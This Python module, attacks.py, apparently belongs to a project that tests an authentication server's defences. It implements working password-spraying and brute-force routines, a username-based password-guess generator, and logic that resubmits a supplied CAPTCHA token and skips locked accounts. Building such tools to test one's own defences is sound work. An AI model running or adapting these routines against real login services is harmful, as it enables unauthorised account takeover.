"""
attacks.py
Attack simulation methods for testing authentication server security.
"""

from typing import List, Optional
import requests
import json
import time
import attacks_const as const

def load_passwords_from_file(file_path: str = None) -> List[str]:
    """
    Load passwords from JSON file.

    :param file_path: Path to passwords JSON file (defaults to const.PASSWORDS_FILE_PATH)
    :return: List of passwords
    """
    if file_path is None:
        file_path = const.PASSWORDS_FILE_PATH

    with open(file_path, 'r', encoding='utf-8') as f:
        passwords = json.load(f)

        print(f"[*] Loaded {len(passwords)} passwords from {file_path}")
        return passwords


def handle_defense_response(
    session: requests.Session,
    server_url: str,
    username: str,
    password: str,
    response: requests.Response,
    endpoint: str = "/login"
) -> Optional[requests.Response]:
    """
    Handle defense mechanism responses from the server.

    Handles:
    - CAPTCHA: Extracts token and retries with it
    - Rate limiting: Waits for retry_after seconds and retries
    - Account lockout: Returns None to signal account is locked
    - TOTP: Returns response as-is (password is correct but TOTP required)

    :param session: requests.Session object
    :param server_url: Base URL of the server
    :param username: Username being attempted
    :param password: Password being attempted
    :param response: Response object from the initial request
    :param endpoint: Login endpoint
    :return: Final response after handling defenses, or None if unable to proceed
    """
    try:
        data = response.json()
    except:
        return response

    # Handle CAPTCHA required
    if data.get("captcha_required"):
        captcha_token = data.get("captcha_token")
        print(f"[!] CAPTCHA required for '{username}' - token: {captcha_token}")

        # Retry with CAPTCHA token
        print(f"[*] Retrying with CAPTCHA token...")
        retry_response = session.post(
            f"{server_url}{endpoint}",
            json={
                "username": username,
                "password": password,
                "captcha_token": captcha_token
            }
        )
        # Recursively handle any additional defenses
        return handle_defense_response(session, server_url, username, password, retry_response, endpoint)

    # Handle account lockout
    if data.get("locked_until_seconds") is not None:
        locked_seconds = data.get("locked_until_seconds")
        print(f"[!] Account '{username}' is locked for {locked_seconds} seconds")
        print(f"[!] Skipping this account (too long to wait)")
        return None

    # Handle TOTP required
    if data.get("totp_required"):
        print(f"[!] TOTP required for '{username}' - cannot bypass in automated attack")
        print(f"[+] Password is correct, but TOTP is enabled")
        return response

    # No special defense handling needed
    return response


def password_spraying(
    server_url: str,
    usernames: List[str],
    endpoint: str = "/login",
    password_limit: int = const.DEFAULT_PASSWORD_LIMIT,
    timeout_seconds: int = const.ATTACK_TIMEOUT,
    start_time: float = None,
):
    """
    Simulate a password spraying attack.

    Tries common passwords against multiple user accounts. This attack avoids
    account lockout by trying one password against many users before moving
    to the next password.

    :param server_url: Base URL of the authentication server (e.g., "http://localhost:8000")
    :param usernames: List of usernames to target
    :param endpoint: Login endpoint to target
    :param password_limit: Maximum number of passwords to try (None for no limit)
    :param timeout_seconds: Maximum time in seconds before terminating attack (default: const.ATTACK_TIMEOUT)
    :param start_time: Optional scenario start time to track time across multiple attacks
    """
    passwords = load_passwords_from_file()

    # Limit the number of passwords if specified
    if password_limit is not None:
        passwords = passwords[:password_limit]

    print(f"[*] Starting password spraying attack")
    print(f"[*] Target: {server_url}{endpoint}")
    print(f"[*] Testing {len(passwords)} passwords against {len(usernames)} users")
    print(f"[*] Total attempts: {len(passwords) * len(usernames)}")
    print(f"[*] Attack timeout: {timeout_seconds} seconds ({timeout_seconds / 60:.1f} minutes)")

    session = requests.Session()
    if start_time is None:
        start_time = time.time()

    # Create mutable copy of usernames list
    remaining_users = list(usernames)

    # Try each password against all users
    for password in passwords:
        # Check if all users have been cracked
        if not remaining_users:
            print(f"\n[+] All users cracked! No more targets remaining.")
            break

        # Check if timeout exceeded
        elapsed_time = time.time() - start_time
        if elapsed_time >= timeout_seconds:
            print(f"\n[!] Attack timeout reached ({elapsed_time:.1f} seconds)")
            print(f"[!] Terminating password spraying attack")
            return elapsed_time

        print(f"\n[*] Trying password: '{password}' (Elapsed: {elapsed_time:.1f}s)")
        print(f"[*] Remaining targets: {len(remaining_users)}")

        # Iterate over a copy to allow modification during iteration
        for username in list(remaining_users):
            # Check timeout before each attempt
            elapsed_time = time.time() - start_time
            if elapsed_time >= timeout_seconds:
                print(f"\n[!] Attack timeout reached ({elapsed_time:.1f} seconds)")
                print(f"[!] Terminating password spraying attack")
                return elapsed_time

            try:
                print(f"[*] Trying user: '{username}'")
                response = session.post(
                    f"{server_url}{endpoint}",
                    json={"username": username, "password": password}
                )

                # Handle defense mechanisms
                final_response = handle_defense_response(
                    session, server_url, username, password, response, endpoint
                )

                if final_response is None:
                    # Account locked or other blocking condition
                    continue

                if final_response.status_code == const.SERVER_SUCCESS:
                    data = final_response.json()
                    if data.get("status") == "success":
                        print(f"[+] SUCCESS! Username: '{username}' Password: '{password}'")
                        remaining_users.remove(username)
                        print(f"[*] Removed '{username}' from target list")
                    elif data.get("totp_required"):
                        print(f"[+] PASSWORD FOUND! Username: '{username}' Password: '{password}' (TOTP enabled)")
                        remaining_users.remove(username)
                        print(f"[*] Removed '{username}' from target list")

            except requests.exceptions.RequestException as e:
                print(f"[!] Error connecting to server: {e}")

    elapsed_time = time.time() - start_time
    print(f"\n[*] Attack completed (Elapsed: {elapsed_time:.1f}s)")
    return elapsed_time


def brute_force_attack(
    server_url: str,
    target_username: str,
    max_attempts: int = None,
    endpoint: str = "/login",
    password_list: List[str] = None,
    timeout_seconds: int = const.ATTACK_TIMEOUT,
    start_time: float = None,
):
    """
    Simulate a brute force attack against a specific user.

    Tries many passwords against a single user account. This is more aggressive
    but more likely to trigger rate limiting mechanisms.

    :param server_url: Base URL of the authentication server (e.g., "http://localhost:8000")
    :param target_username: Username to target
    :param password_list: List of passwords to try (defaults to COMMON_PASSWORDS + generated variations)
    :param max_attempts: Maximum number of attempts before stopping (None for unlimited)
    :param timeout_seconds: Maximum time in seconds before terminating attack (default: const.ATTACK_TIMEOUT)
    :param start_time: Optional scenario start time to track time across multiple attacks
    """
    if password_list is None:
        # Use common passwords plus some variations
        combined = load_passwords_from_file() + _generate_password_variations(target_username)

        # Remove duplicates while preserving order
        seen = set()
        password_list = []
        for pwd in combined:
            if pwd not in seen:
                seen.add(pwd)
                password_list.append(pwd)

    login_url = f"{server_url}{endpoint}"

    session = requests.Session()
    if start_time is None:
        start_time = time.time()

    # Calculate remaining time from scenario start
    elapsed_from_scenario = time.time() - start_time
    remaining_time = max(0, timeout_seconds - elapsed_from_scenario)

    print(f"[*] Starting brute force attack")
    print(f"[*] Target: {server_url}")
    print(f"[*] Target username: '{target_username}'")
    print(f"[*] Password list size: {len(password_list)}")
    print(f"[*] Attack timeout: {remaining_time:.1f} seconds ({remaining_time / 60:.1f} minutes) [remaining from scenario]")

    attempts = 0

    for i, password in enumerate(password_list, 1):
        # Check if timeout exceeded
        elapsed_time = time.time() - start_time
        if elapsed_time >= timeout_seconds:
            print(f"\n[!] Attack timeout reached ({elapsed_time:.1f} seconds)")
            print(f"[!] Terminating brute force attack after {attempts} attempts")
            return elapsed_time

        # Check if we've reached max_attempts
        if max_attempts and attempts >= max_attempts:
            print(f"\n[*] Reached maximum attempts limit ({max_attempts})")
            break

        attempts += 1
        try:
            response = session.post(
                login_url,
                json={"username": target_username, "password": password},
                timeout=const.DEFAULT_TIMEOUT
            )

            # Handle defense mechanisms
            final_response = handle_defense_response(
                session, server_url, target_username, password, response, endpoint
            )

            if final_response is None:
                # Account locked - cannot continue
                print(f"\n[!] Account locked - attack cannot continue")
                break

            if final_response.status_code == const.SERVER_SUCCESS:
                data = final_response.json()
                if data.get("status") == "success":
                    print(f"\n[+] SUCCESS! Password found: '{password}'")
                    print(f"[+] Cracked {target_username} after {attempts} attempts")
                    elapsed_time = time.time() - start_time
                    return elapsed_time
                elif data.get("totp_required"):
                    print(f"\n[+] PASSWORD FOUND! '{password}' (TOTP enabled)")
                    print(f"[+] Cracked {target_username} password after {attempts} attempts")
                    elapsed_time = time.time() - start_time
                    return elapsed_time

        except requests.exceptions.RequestException as e:
            print(f"[!] Error connecting to server: {e}")

    elapsed_time = time.time() - start_time
    print(f"\n[*] Attack completed (Elapsed: {elapsed_time:.1f}s)")
    print(f"[*] Password NOT found after {attempts} attempts")
    return elapsed_time


def _generate_password_variations(username: str = None) -> List[str]:
    """
    Generate additional password variations for brute force attacks.
    
    :param username: Optional username to generate username-based variations
    :return: List of password variations
    """
    variations = []
    
    # Common number patterns
    for i in range(const.PASSWORD_GEN_NUMBER_START, const.PASSWORD_GEN_NUMBER_END, 
                   const.PASSWORD_GEN_NUMBER_STEP):
        variations.append(str(i))
    
    # Year-based passwords
    for year in range(const.PASSWORD_GEN_YEAR_START, const.PASSWORD_GEN_YEAR_END):
        variations.append(str(year))
    
    # Common words with numbers
    for word in const.PASSWORD_GEN_COMMON_WORDS:
        for num in range(const.PASSWORD_GEN_NUMBER_RANGE):
            variations.append(f"{word}{num}")
            variations.append(f"{word}{num}{num}")
            variations.append(f"{num}{word}")
    
    # Username-based variations
    if username:
        # Add username as-is and common variations
        variations.append(username)
        variations.append(username.capitalize())
        variations.append(username.upper())
        variations.append(username.lower())
        
        # Username with numbers
        for num in range(const.PASSWORD_GEN_NUMBER_RANGE):
            variations.append(f"{username}{num}")
            variations.append(f"{username}{num}{num}")
            variations.append(f"{num}{username}")
        
        # Username with years
        for year in range(const.PASSWORD_GEN_YEAR_START, const.PASSWORD_GEN_YEAR_END):
            variations.append(f"{username}{year}")
            variations.append(f"{year}{username}")
        
        # Common punctuation patterns
        variations.append(f"{username}!")
        variations.append(f"{username}@")
        variations.append(f"{username}123")
    
    return variations
